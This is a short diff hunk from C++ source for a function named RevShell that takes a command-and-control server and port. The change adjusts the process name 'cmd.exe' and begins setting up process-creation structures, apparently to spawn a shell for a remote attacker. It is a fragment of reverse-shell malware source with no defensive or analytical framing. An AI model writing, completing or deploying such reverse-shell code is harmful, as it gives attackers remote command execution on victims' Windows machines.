@@ -61,7 +61,7 @@ void RevShell(char* C2Server, int C2Port)
 			}
 			else {
 				std::cout << "[DBG] 3\n";
-				wchar_t Process[] = L"cmd.exe";
+				char Process[] = "cmd.exe";
 				STARTUPINFO sinfo;
 				PROCESS_INFORMATION pinfo;
 				memset(&sinfo, 0, sizeof(sinfo));
